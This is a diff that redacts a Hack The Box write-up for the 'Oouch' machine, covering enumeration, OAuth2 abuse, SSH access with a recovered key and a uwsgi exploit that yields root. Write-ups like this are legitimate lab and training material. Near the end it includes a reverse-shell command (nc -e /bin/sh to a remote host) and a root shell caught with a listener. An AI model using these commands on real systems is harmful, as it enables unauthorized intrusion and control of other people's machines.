@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Oouch
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-oouch-infocard.png)
-
 This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2.  Persistence and the ability to take error messages and learn from them were necessary to progress through this machine.
 
 ## Useful Skills and Tools
@@ -21,14 +19,14 @@ This had difficulty Linux machine taught me a lot about the internal workings of
 
 ### Nmap scan
 
-First off, I started my enumeration with an nmap scan of `10.10.10.177`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` which saves the output with a filename of `<name>`.
+First off, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` which saves the output with a filename of `<name>`.
 
 ```bash
-zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch 10.10.10.177
+zweilos@kalimaa:~/htb/oouch$ nmap -p- -sC -sV -oA oouch <YOUR_IP>
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 14:10 EDT
-WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
-Nmap scan report for 10.10.10.177
+WARNING: Service <YOUR_IP>:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
+Nmap scan report for <YOUR_IP>
 Host is up (0.13s latency).
 Not shown: 65529 closed ports
 PORT      STATE    SERVICE VERSION
@@ -55,7 +53,7 @@ PORT      STATE    SERVICE VERSION
 5000/tcp  open     http    nginx 1.14.2
 |_http-server-header: nginx/1.14.2
 | http-title: Welcome to Oouch
-|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+|_Requested resource was http://<YOUR_IP>:5000/login?next=%2F
 5643/tcp  filtered unknown
 8000/tcp  open     rtsp
 | fingerprint-strings: 
@@ -101,11 +99,11 @@ Nmap done: 1 IP address (1 host up) scanned in 2390.62 seconds
 When doing my initial reconnaissance, I prefer to test for anonymous access to remote access and file sharing services such as ftp, telnet, and SMB before tacking more time and resource intensive services.  In this case since port 21 was open, my first step was to login to FTP as `anonymous`.  
 
 ```http
-zweilos@kalimaa:~/htb/oouch$ ftp 10.10.10.177
+zweilos@kalimaa:~/htb/oouch$ ftp <YOUR_IP>
 
-Connected to 10.10.10.177. 
+Connected to <YOUR_IP>. 
 220 qtc's development server 
-Name (10.10.10.177:zweilos): anonymous 
+Name (<YOUR_IP>:zweilos): anonymous 
 230 Login successful.    
 Remote system type is UNIX. 
 Using binary mode to transfer files.
@@ -145,13 +143,13 @@ The contents of the file revealed that `Flask` and `Django` were the two types o
 Next I checked SSH, but it did not allow me to connect without a private key _\(I did note that there is no password required though\)_.
 
 ```text
-zweilos@kalimaa:~/htb/oouch$ ssh 10.10.10.177
-zweilos@10.10.10.177: Permission denied (publickey).
+zweilos@kalimaa:~/htb/oouch$ ssh <YOUR_IP>
+zweilos@<YOUR_IP>: Permission denied (publickey).
 ```
 
 ### Website on port 5000
 
-The next open port on my list was 5000.  This is a non-standard port and could have been anything, but Nmap reported that there was an Nginx server hosting an HTTP server there, so I fired up my browser to check it out.  Navigating to `http://10.10.10.177:5000` led to a pretty bare-bones login page.
+The next open port on my list was 5000.  This is a non-standard port and could have been anything, but Nmap reported that there was an Nginx server hosting an HTTP server there, so I fired up my browser to check it out.  Navigating to `http://<YOUR_IP>:5000` led to a pretty bare-bones login page.
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_15-36-13.png)
 
@@ -169,7 +167,7 @@ Attempting to check for XSS on the contact page using `javascript:alert(document
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-09_16-04-27.png)
 
-Next I used Gobuster to search for more accessible directories and found an `/oauth` page. `http://10.10.10.177:5000/oauth` led to a "hidden" page with the following links:
+Next I used Gobuster to search for more accessible directories and found an `/oauth` page. `http://<YOUR_IP>:5000/oauth` led to a "hidden" page with the following links:
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-10_10-17-42.png)
 
@@ -181,9 +179,9 @@ Next I used Gobuster to search for more accessible directories and found an `/oa
 After clicking the `/connect` link, I was redirected to `http://authorization.oouch.htb:8000/login/`. I added each of the newly found domains to my `/etc/hosts` file so I could proceed.
 
 ```text
-10.10.10.177    oouch.htb
-10.10.10.177    consumer.oouch.htb
-10.10.10.177    authorization.oouch.htb
+<YOUR_IP>    oouch.htb
+<YOUR_IP>    consumer.oouch.htb
+<YOUR_IP>    authorization.oouch.htb
 ```
 
 I didn't have any credentials that worked for the authorization site, so I began poking around to see if there was a way to register. The register link was at the root at `http://authorization.oouch.htb:8000/`.
@@ -501,7 +499,7 @@ Note: Don't forget to**`chmod 600`** your SSH keys before use!
 ```bash
 zweilos@kalimaa:~/htb/oouch$ chmod 600 qtc.id_rsa
 zweilos@kalimaa:~/htb/oouch$
-zweilos@kalimaa:~/htb/oouch$ ssh qtc@10.10.10.177 -i qtc.id_rsa
+zweilos@kalimaa:~/htb/oouch$ ssh qtc@<YOUR_IP> -i qtc.id_rsa
 
 Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
 
@@ -519,7 +517,7 @@ qtc@oouch:~$ uname -a
 Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
 
 qtc@oouch:~$ cat user.txt 
-6c92fdd3954c49f4c3e0e76d95d0cd2b
+****
 
 qtc@oouch:~$ cat .note.txt 
 Implementing an IPS using DBus and iptables == Genius?
@@ -710,7 +708,7 @@ The `uwsgi` service was running on the `oouch`box, and I also found the `wsgi.in
 I then tried to run the exploit to try to get a reverse shell:
 
 ```bash
-zweilos@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://10.10.10.177:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
+zweilos@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://<YOUR_IP>:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
 usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
 uwsgi.py: error: the following arguments are required: -u/--uwsgi
 ```
@@ -840,15 +838,11 @@ Looking back, I probably could have used an SSH tunnel to connect through from m
 ```bash
 qtc@oouch:/etc/dbus-1/system.d$ nc -lvnp 1234
 listening on [any] 1234 ...
-connect to [172.18.0.1] from (UNKNOWN) [10.10.10.177] 50776
+connect to [172.18.0.1] from (UNKNOWN) [<YOUR_IP>] 50776
 /bin/sh: 0: can't access tty; job control turned off
 # whoami && hostname
 root
 oouch
 # cat root.txt
-d63a830d3105bfeb7bb05f994080f187
+****
 ```
-
-Thanks to [`qtc`](https://www.hackthebox.eu/home/users/profile/103578) for a very fun and very challenging box!
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
